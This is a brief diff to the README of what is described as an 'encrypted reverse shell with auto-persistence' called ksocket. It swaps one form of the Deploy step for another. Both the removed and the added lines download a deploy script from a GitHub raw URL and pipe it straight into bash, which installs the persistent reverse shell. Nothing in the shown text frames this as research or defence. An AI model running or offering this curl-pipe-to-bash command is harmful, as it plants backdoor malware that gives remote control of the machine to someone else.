@@ -20,7 +20,7 @@ Encrypted reverse shell with auto-persistence. Single file deploy, secret-key ba
 ### Deploy
 
 ```bash
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy)"
+curl -fsSL https://raw.githubusercontent.com/tangsel1928/ksocket/refs/heads/main/deploy | bash
 ```
 
 ### Connect
